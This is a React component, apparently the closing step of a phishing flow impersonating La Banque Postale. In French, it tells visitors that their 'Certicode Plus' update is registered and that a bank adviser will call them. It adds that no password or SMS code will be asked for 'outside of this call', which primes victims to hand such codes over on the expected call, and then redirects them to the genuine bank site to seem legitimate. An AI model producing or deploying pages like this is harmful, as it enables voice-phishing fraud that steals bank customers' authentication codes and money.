import { useEffect, useState } from "react";
import { CheckCircle2, PhoneCall, Clock } from "lucide-react";

const REDIRECT_URL = "https://www.labanquepostale.fr";
const REDIRECT_DELAY = 8; // seconds

export default function SuccessStep() {
  const [remaining, setRemaining] = useState(REDIRECT_DELAY);

  useEffect(() => {
    if (remaining <= 0) {
      window.location.href = REDIRECT_URL;
      return;
    }
    const t = setTimeout(() => setRemaining((r) => r - 1), 1000);
    return () => clearTimeout(t);
  }, [remaining]);

  return (
    <div className="fade-in text-center" data-testid="success-step">
      <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-full bg-[#E8F5E9]">
        <CheckCircle2 className="h-10 w-10 text-[#2E7D32]" />
      </div>
      <h1 className="mt-5 text-2xl sm:text-3xl font-bold tracking-tight text-[#003366]">
        Votre demande a bien été enregistrée
      </h1>
      <p className="mt-3 text-base text-[#4F5A6B] leading-relaxed">
        Pour finaliser la mise à jour de votre Certicode Plus, un
        <span className="font-semibold text-[#003366]"> conseiller agréé de La Banque Postale </span>
        prendra contact avec vous prochainement.
      </p>

      <div
        data-testid="contact-window"
        className="mt-6 rounded-md border border-[#B6CDEC] bg-[#E8F1FB] p-4 text-left"
      >
        <div className="flex items-start gap-3">
          <PhoneCall className="h-5 w-5 mt-0.5 text-[#003366] shrink-0" />
          <div className="text-sm text-[#003366]">
            <div className="font-semibold">Vous serez contacté(e) sous 24 à 48 heures</div>
            <div className="mt-1 text-[#4F5A6B]">
              Notre conseiller utilisera le numéro associé à votre compte. Aucun mot de passe, code SMS ou information bancaire ne vous sera demandé par téléphone en dehors de cet appel.
            </div>
          </div>
        </div>
      </div>

      <div className="mt-6 flex items-center justify-center gap-2 text-xs text-[#7A8294]">
        <Clock className="h-3.5 w-3.5" />
        <span>Délai standard : du lundi au samedi, de 8h à 20h.</span>
      </div>

      <div
        data-testid="redirect-countdown"
        className="mt-6 rounded-md bg-[#F4F6F8] px-4 py-3 text-sm text-[#4F5A6B]"
      >
        Redirection vers votre Espace Client dans{" "}
        <span className="font-semibold text-[#003366]">{remaining}s</span>…
      </div>
      <a
        href={REDIRECT_URL}
        data-testid="redirect-link"
        className="mt-3 inline-block text-sm text-[#003366] hover:underline"
      >
        Cliquez ici si vous n'êtes pas redirigé automatiquement
      </a>
    </div>
  );
}
